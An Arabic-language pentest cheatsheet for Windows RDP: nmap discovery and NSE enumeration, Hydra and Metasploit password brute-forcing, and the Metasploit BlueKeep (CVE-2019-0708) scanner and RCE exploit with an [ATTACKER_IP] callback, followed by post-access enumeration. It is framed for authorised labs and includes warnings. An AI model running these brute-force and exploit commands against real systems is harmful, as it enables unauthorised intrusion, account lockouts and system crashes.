1. Reconnaissance

حدد الهدف ومسار الشبكة أولًا، ثم تأكد أن الجهاز Windows وأن RDP ضمن الخدمات المحتملة.

معرفة عنوان جهازك وواجهة الـVPN KALI TERMINAL
ip a ip route
إذا كنت داخل Lab/VPN راقب واجهة tun0 والمسار المؤدي إلى شبكة الهدف.
فحص وصول مبدئي للهدف KALI TERMINAL
ping -c 4 [TARGET]
عدم الرد على ICMP لا يعني أن الجهاز غير موجود؛ انتقل للفحص حتى لو لم يرد.
RDP غالبًا يعمل على 3389/TCP، وقد يظهر أيضًا على بورت غير قياسي؛ لا تستبعده بسبب رقم البورت فقط.

2. Port Scanning

اكتشف RDP على البورت القياسي أو أي بورت غير معتاد قبل الانتقال للاختبارات.

فحص RDP القياسي مع Service Detection KALI TERMINAL
nmap -Pn -sV -p3389 [TARGET]
✓ إذا كان مفتوحًا سترى 3389/tcp open مع خدمة مرتبطة بـMicrosoft Terminal Services/RDP.
فحص شامل عند عدم ظهور 3389 KALI TERMINAL
nmap -p- --min-rate=1000 -T4 [TARGET]
بعد اكتشاف بورت مشتبه به، أعد فحصه بشكل مركز بدل افتراض أن كل RDP على 3389.
فحص البورت المشتبه به KALI TERMINAL
nmap -Pn -sV -sC -p[PORT] [TARGET]
قد يظهر RDP على بورت غير قياسي؛ استخدم [PORT] في الملف بدل ربط الـworkflow برقم لاب محدد.

3. Enumeration

أكد أن الخدمة RDP، وافحص خصائصها الأمنية قبل اختبار أي بيانات دخول.

تأكيد RDP عبر Metasploit Scanner MSFCONSOLE
use auxiliary/scanner/rdp/rdp_scanner set RHOSTS [TARGET] set RPORT [PORT] run
مفيد خصوصًا عندما تكون الخدمة على بورت غير قياسي.
RDP Enumeration عبر Nmap NSE KALI TERMINAL
nmap -p[PORT] --script=rdp-enum-encryption [TARGET]
يساعد في فهم طبقات الأمان والتشفير التي يقبلها الـendpoint.
فحص معلومات NTLM عبر RDP KALI TERMINAL
nmap -p[PORT] --script=rdp-ntlm-info [TARGET]
قد يكشف معلومات مفيدة عن Windows/Domain بدون تسجيل دخول.
إذا ظهر NLA فلا تعتبره ثغرة؛ هو شرط مصادقة قبل إنشاء جلسة سطح المكتب، ويؤثر على طريقة الاتصال والاختبار.

4. Credential Testing

اختبر بيانات الدخول المصرح بها أو قوائم اللاب، ثم تحقق منها بجلسة RDP فعلية.

Password Testing عبر Hydra KALI TERMINAL
hydra -L [USERLIST] -P [WORDLIST] rdp://[TARGET] -s [PORT]
الخيار -s مهم عندما تكون RDP على بورت غير قياسي. استخدم فقط قوائم اللاب/الاختبار المصرح بها.
اختبار تسجيل الدخول عبر Metasploit MSFCONSOLE
use auxiliary/scanner/rdp/rdp_login set RHOSTS [TARGET] set RPORT [PORT] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] run
مسار بديل للاختبار إذا كان الموديول متاحًا في نسخة Metasploit لديك.
التحقق من Credentials بجلسة فعلية KALI TERMINAL
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
✓ نجاح البيانات يظهر بوصول فعلي إلى Windows Desktop أو بدء جلسة RDP.
تنبيه: لا ترفع سرعة Password Testing بشكل عشوائي؛ سياسات Lockout قد تقفل الحساب. التزم بقيود اللاب أو التفويض.

5. Exploitation

Primary path: Detect → NLA/Auth → Credential Testing → Login → Version-specific vulnerability check → Exploit only if matched.

Version/OS-specific vulnerability checks تأتي بعد Detect → NLA/Auth → Credential Testing → Login. الاستغلال فقط عند التطابق.

فحص BlueKeep — CVE-2019-0708 MSFCONSOLE VERSION/OS-SPECIFIC
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep set RHOSTS [TARGET] set RPORT [PORT] run
عند فحص BlueKeep ابدأ بالـscanner ولا تقفز مباشرة إلى exploit.
تشغيل BlueKeep فقط بعد تحقق التطابق MSFCONSOLE VERSION/OS-SPECIFIC
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce set RHOSTS [TARGET] set RPORT [PORT] show targets set TARGET [MATCHED_TARGET] set LHOST [ATTACKER_IP] run
اختر Target المطابق لبيئتك وإصدار Windows بدل نسخ رقم Target ثابت بشكل أعمى.
تحذير مهم: BlueKeep قد يسبب Crash للنظام. لا تشغله إلا داخل Lab/نظام مصرح به وبعد التحقق من Windows version وarchitecture وpreconditions.

6. Post-Exploitation

بعد الوصول عبر RDP، نفذ فقط التحقق الفوري المرتبط بالجلسة ثم انتقل لملفات Post-Exploitation المتخصصة.

تأكيد هوية المستخدم WINDOWS CMD
whoami whoami /groups
✓ يعرض الحساب الحالي والمجموعات التي ينتمي إليها.
تأكيد النظام والشبكة WINDOWS CMD
hostname systeminfo ipconfig /all
سجّل اسم الجهاز، إصدار Windows، وواجهات الشبكة قبل أي خطوة لاحقة.
فحص الصلاحيات الحالية WINDOWS CMD
whoami /priv
يساعدك على معرفة الامتيازات الحالية بدون تنفيذ Privilege Escalation كامل داخل ملف RDP.
إذا كان الهدف يحتاج Privilege Escalation أو Credential Access أو Pivoting، انتقل للـCheatsheets العامة المخصصة بدل تكرار تلك المراحل كاملة هنا.
